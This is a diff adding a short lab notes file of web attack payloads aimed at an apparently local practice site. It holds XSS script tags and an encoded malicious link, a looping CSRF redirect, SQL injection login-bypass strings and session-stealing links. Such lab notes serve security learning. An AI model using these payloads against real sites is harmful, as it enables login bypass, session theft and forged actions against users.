@@ -1,0 +1,27 @@
+// Non Persistent Scripts
+<font color="red">
+<i>
+<script>alert("alert!")</script>
+
+// Modified Hyperlink
+http://localhost:8001/non_persistentXSS.php?search=%3Cscript%3Ealert%28%22alert%21%22%29%3C%2Fscript%3E
+
+// Persistent Scripts
+<script>alert("alert!")</script>
+<script>window.location="https://www.google.com"</script>
+<script>window.location="CSRF.php"</script>  // carefull spams autopost in a loop
+
+// Cross Site Request Forgery
+Posts "autopost" as user on load.
+
+
+// SQL Injection
+username:	' OR'1'='1
+password:	') OR ('1' = '1
+
+username:	' OR'1'='1
+password:	') OR ('1' = '1' AND firstName = 'Admin
+
+// Steal Session
+<a href="Stealsession.php">Link</a>
+<a onMouseOver="document.location.href='Stealsession.php'" >Link 2</a>
